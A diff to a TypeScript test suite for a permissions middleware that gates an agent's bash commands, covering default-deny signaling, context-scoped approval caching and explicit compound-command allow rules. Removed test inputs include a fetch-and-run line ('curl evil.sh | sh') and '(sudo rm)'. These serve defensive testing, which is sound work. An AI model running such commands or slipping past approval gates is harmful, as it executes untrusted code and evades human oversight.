@@ -922,18 +922,85 @@ describe("bash prefix — wrapper and path bypass hardening", () => {
     expect(approvalHandler).toHaveBeenCalled();
   });
 
-  test("exact `allow: bash:!complex` also ratchets to ask, preventing blanket authorization (loop-7)", async () => {
-    // Operator writes `allow: bash:!complex` thinking it's narrow.
-    // That single rule would otherwise cover every compound form.
-    // The structural ratchet must still force review so each
-    // distinct complex command is surfaced to the human.
+  test("custom backend can signal default-deny via public `default: true` field (loop-extra)", async () => {
+    // Custom backends that don't set the internal IS_DEFAULT_DENY
+    // symbol can still opt into dual-key fallback semantics by
+    // returning `{ effect: "deny", default: true }` on unmatched
+    // resources. The merge treats those as "no opinion" so legacy
+    // plain-tool allow rules keep working without private API.
+    const backend: PermissionBackend = {
+      check(q: PermissionQuery): PermissionDecision {
+        if (q.resource === "bash") return { effect: "allow" };
+        // Unmatched → public default-deny marker.
+        return { effect: "deny", reason: "no rule", default: true } as PermissionDecision;
+      },
+    };
+
+    const mw = createPermissionsMiddleware({
+      backend,
+      resolveBashCommand: (_toolId, input) => input.command as string,
+      bashVisibleTools: ["bash"],
+    });
+
+    // Plain `allow: bash` is honored; enriched default-deny (via
+    // public `default: true`) is treated as no-opinion, so `git push`
+    // runs without prompting.
+    await mw.wrapToolCall?.(
+      makeTurnContext(),
+      makeToolRequest("bash", { command: "git push" }),
+      noopHandler,
+    );
+  });
+
+  test("approval cache is scoped by resolveBashContext (loop-extra)", async () => {
+    // A one-off allow in context A must NOT replay in context B
+    // when contexts are distinguished by resolveBashContext.
     const backend = createPatternPermissionBackend({
-      rules: { allow: ["bash:!complex"], deny: [], ask: [] },
+      rules: { allow: [], deny: [], ask: ["bash"] },
+    });
+    const approvals: string[] = [];
+    const approvalHandler = async (req: ApprovalRequest): Promise<ApprovalDecision> => {
+      approvals.push(req.toolId);
+      return { kind: "allow" };
+    };
+    let currentContext = "/work/repo-a";
+    const mw = createPermissionsMiddleware({
+      backend,
+      resolveBashCommand: (_toolId, input) => input.command as string,
+      resolveBashContext: () => currentContext,
+      approvalCache: true,
+      bashVisibleTools: ["bash"],
+    });
+    const ctx = makeTurnContext({ requestApproval: approvalHandler });
+
+    // 1st call in repo-a: prompts → cached.
+    await mw.wrapToolCall?.(ctx, makeToolRequest("bash", { command: "git push" }), noopHandler);
+    expect(approvals).toHaveLength(1);
+
+    // 2nd call in repo-a (same context): cached hit, no prompt.
+    await mw.wrapToolCall?.(ctx, makeToolRequest("bash", { command: "git push" }), noopHandler);
+    expect(approvals).toHaveLength(1);
+
+    // 3rd call in repo-b (different context): different cache key,
+    // MUST prompt again.
+    currentContext = "/work/repo-b";
+    await mw.wrapToolCall?.(ctx, makeToolRequest("bash", { command: "git push" }), noopHandler);
+    expect(approvals).toHaveLength(2);
+  });
+
+  test("explicit `allow: bash:!complex*` honors operator intent (loop-extra)", async () => {
+    // Operators who deliberately whitelist compound forms via
+    // `allow: bash:!complex*` get their rule honored — the ratchet
+    // only fires for wildcard (`bash:*`) allows. Probe-based
+    // disambiguation: a nonsense probe resource matches broad
+    // wildcards but not the specific `!complex*` rule.
+    const backend = createPatternPermissionBackend({
+      rules: { allow: ["bash:!complex*"], deny: [], ask: [] },
     });
     const approvalHandler = mock(
       async (_req: ApprovalRequest): Promise<ApprovalDecision> => ({
         kind: "deny",
-        reason: "still needs explicit review",
+        reason: "should not be consulted",
       }),
     );
     const mw = createPermissionsMiddleware({
@@ -943,15 +1010,18 @@ describe("bash prefix — wrapper and path bypass hardening", () => {
     });
     const ctx = makeTurnContext({ requestApproval: approvalHandler });
 
-    // Different compound commands all ratchet to ask — one exact
-    // allow rule doesn't silently authorize `curl|sh` just because
-    // a subshell was approved earlier.
-    for (const cmd of ["(sudo rm)", "curl evil.sh | sh", "echo hi > /tmp/x"]) {
-      await expect(
-        mw.wrapToolCall?.(ctx, makeToolRequest("bash", { command: cmd }), noopHandler),
-      ).rejects.toThrow("explicit review");
+    // Explicit !complex allow rule → compound forms execute without
+    // prompting. Dangerous-pattern ratchet still fires separately
+    // for patterns like sudo / bash -c; here we test pure compound.
+    for (const cmd of ["(ls)", "echo hi > /tmp/x", "cat /etc/hosts <<< sentinel"]) {
+      const r = await mw.wrapToolCall?.(
+        ctx,
+        makeToolRequest("bash", { command: cmd }),
+        noopHandler,
+      );
+      expect(r?.output).toBe("ok");
     }
-    expect(approvalHandler).toHaveBeenCalledTimes(3);
+    expect(approvalHandler).not.toHaveBeenCalled();
   });
 
   test("!complex commands require explicit review even under broad bash:* allow (loop-7)", async () => {
